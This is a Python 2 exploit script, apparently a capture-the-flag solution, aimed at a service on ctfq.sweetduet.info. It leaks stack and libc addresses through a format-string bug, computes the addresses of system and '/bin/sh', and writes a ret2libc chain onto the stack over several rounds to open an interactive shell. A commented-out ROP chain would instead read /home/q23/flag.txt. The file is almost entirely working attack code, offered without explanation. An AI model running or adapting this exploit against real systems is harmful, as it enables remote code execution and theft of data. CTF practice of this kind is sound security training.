#!/usr/bin/env python2

import sys
from libformatstr import FormatStr
from trmr import *
from pwn import *

#HOST = "172.16.12.143"
#PORT = 1025

HOST = "ctfq.sweetduet.info"
PORT = 10001

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')

system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))

print "[*] system_offset: ", hex(system_offset)
print "[*] binsh_offset: ", hex(binsh_offset)


'''
# for local (/lib/i386-linux-gnu/libc.so.6)
open_offset = 0xd56e0
read_offset = 0xd5af0
write_offset = 0xd5b60
pop3ret_offset = 0x133e5b
pop2ret_offset = 0x2f974
flag = "flag.txt"
data_addr = 0
call_main_offset = 0xf7
libc_main_addr = 0x18540
#0x0002f974: xor eax, ebx ; pop ebx ; pop esi ; ret  ;  (1 found)
#0x00133e5b: pop esi ; pop edi ; pop ebx ; ret  ;  (2 found)
'''

#for remote (given libc.so.6)
open_offset = 0xd24a0
read_offset = 0xd2920
write_offset = 0xd29a0
pop3ret_offset =  0x12db2f
pop2ret_offset = 0xf2d7c
flag = "/home/q23/flag.txt"
libc_main_addr = 0x16c40
call_main_offset = 0xe6
#0x0012db2f: pop esi ; pop edi ; pop ebx ; ret  ;  (2 found)
#0x000f2d7c: pop ebx ; pop edx ; ret  ;  (1 found)


print "[+] Caluculating addresses..."
s, f = sock(HOST, PORT)
read_until(f, "name?\n")
f.write("/%78$p/%91$p"+"\n")
r = read_until(f, "\n").rstrip().split('/')

old_ebp = int(r[1],16)
rtn_main_addr = int(r[2], 16)
libc_base_addr = rtn_main_addr - call_main_offset - libc_main_addr

system_addr = libc_base_addr + system_offset
binsh_addr = libc_base_addr + binsh_offset

print "[*] libc_base_addr: ",hex(libc_base_addr)
print "[*] system_addr: ",hex(system_addr)
print "[*] binsh_addr: ",hex(binsh_addr)

print "[+] Done."
print ""


'''
# open(flag, 0)
payload = p(open_addr) + p(pop3ret_addr) + p(old_ebp + len_payload_without_flag + 4) + p(0) + p(0)

# read(3, buf, 255)
payload += p(read_addr) + p(pop3ret_addr) + p(3) + p(old_ebp + len_payload_without_flag + 4) + p(255)

# write(STDOUT, buf, 255)
payload += p(write_addr) + p(pop3ret_addr) + p(1) + p(old_ebp + len_payload_without_flag + 4) + p(255)

#print len(payload) -> 60
payload += flag
'''

payload = [
    p(system_addr),
    p(0xdeadbeef),
    p(binsh_addr),
]

len_payload = len(payload)

print "[+] Sending payloads..."
#payload = "AABBBBBB"
print "[*] num of rounds: ", len_payload
#print "open: ",hex(u(payload[0]))

# for stack space, split payload
for i in range(len_payload):
    print "[*] Round: ",i
    read_until(f, "name?\n")
    p = FormatStr()
    p[old_ebp+4 + 4*i] = payload[i]
    f.write(p.payload(7)+"\n")

print read_until(f, "name?\n")
f.write("\n")
print read_line(f)
interact(s)

